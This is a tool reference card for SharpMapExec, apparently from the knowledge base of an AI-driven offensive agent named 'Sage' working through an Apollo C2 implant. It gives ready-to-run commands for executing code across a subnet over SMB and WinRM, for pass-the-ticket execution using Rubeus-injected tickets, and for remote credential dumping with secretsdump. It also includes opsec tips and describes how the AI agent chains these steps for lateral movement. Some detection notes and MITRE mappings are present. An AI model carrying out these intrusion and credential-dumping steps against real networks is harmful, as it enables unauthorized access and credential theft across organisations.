---
name: SharpMapExec
category: lateral-movement
subcategories: [smb-enumeration, winrm-exec, token-reuse, distributed-execution]
tradecraft_tags: [sharpmapexec, smb, winrm, dotnet, lateral-movement, cme-alternative, apollo-runnable]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
  - id: T1021.006
    name: Remote Services — Windows Remote Management
source:
  url: https://github.com/cube0x0/SharpMapExec
  license: MIT
  maintained: false
binary_type: .net-assembly
binary_filename: SharpMapExec.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  SMB and WinRM authentication events on targets (Event 4624 type 3). Mass authentication
  across a subnet is anomalous. Command execution via WMI/PSExec patterns are individually
  detectable. Same detection profile as CrackMapExec but from a Windows host.
usage_examples:
  - description: SMB scan and exec across a subnet (Windows-side CrackMapExec equivalent)
    args: "SharpMapExec.exe smb /command:exec /cmd:'whoami' /targets:192.168.1.0/24 /user:administrator /pass:Password123"
  - description: WinRM execution with current token
    args: "SharpMapExec.exe winrm /command:exec /cmd:'whoami' /targets:192.168.1.22"
  - description: Kerberos token execution (pass-the-ticket)
    args: "SharpMapExec.exe smb /command:exec /cmd:'whoami' /targets:192.168.1.22 /kerberos"
  - description: Dump credentials via secretsdump
    args: "SharpMapExec.exe smb /command:secretsdump /targets:192.168.1.22 /user:administrator /pass:Password123"
opsec_notes: |
  SharpMapExec is the Windows-side (Apollo inline_assembly) equivalent of CrackMapExec.
  Key advantage: runs from within an Apollo agent without Python infrastructure. The
  `/kerberos` flag uses the current token's Kerberos tickets for authentication — enabling
  lateral movement purely from injected tickets without credentials.
gotchas: |
  Not actively maintained (cube0x0 project, ~2021). WinRM module requires WinRM enabled
  on targets. SMB execution requires admin access. The kerberos mode uses the agent's
  current Kerberos credential context — inject a ticket with Rubeus first for
  pass-the-ticket lateral movement. Subnet scanning generates high event volume.
related_ttps: [crackmapexec, sharpwmi, rubeus, pass-the-ticket]
alternatives: [crackmapexec, sharpwmi, impacket-wmiexec]
common_args:
  smb:
    description: SMB protocol mode
    typical_values: [flag-only]
  winrm:
    description: WinRM protocol mode
    typical_values: [flag-only]
  /command:
    description: Action to perform
    typical_values: [exec, secretsdump, smbexec, wmiexec]
  /cmd:
    description: Command to execute
    typical_values: ["whoami", "cmd.exe /c ..."]
  /targets:
    description: Target IP, hostname, or CIDR
    typical_values: ["192.168.1.22", "192.168.1.0/24"]
    required: true
  /user:
    description: Username for authentication
    typical_values: ["administrator"]
  /pass:
    description: Password for authentication
    typical_values: ["Password123"]
  /kerberos:
    description: Use current Kerberos token (no explicit credentials)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# SharpMapExec

cube0x0's Windows-side equivalent of CrackMapExec — a .NET assembly for distributed
lateral movement and credential testing via SMB and WinRM. The key advantage over
CrackMapExec: it runs via Apollo's inline_assembly from within a compromised Windows
host, without requiring Python infrastructure. Supports Kerberos ticket-based auth
(pass-the-ticket lateral movement).

## Typical use cases
- SMB/WinRM lateral movement from within an Apollo agent
- Subnet-wide credential testing using current Kerberos tickets
- Remote credential dumping via secretsdump API

## How Sage uses this
SharpMapExec is the Apollo-compatible lateral movement tool for multi-target operations.
When Sage has injected a ticket (via Rubeus ptt) and needs to move to multiple targets,
SharpMapExec provides CrackMapExec-style capabilities without needing Linux infrastructure.

## Output
Per-target output showing access level and command results.
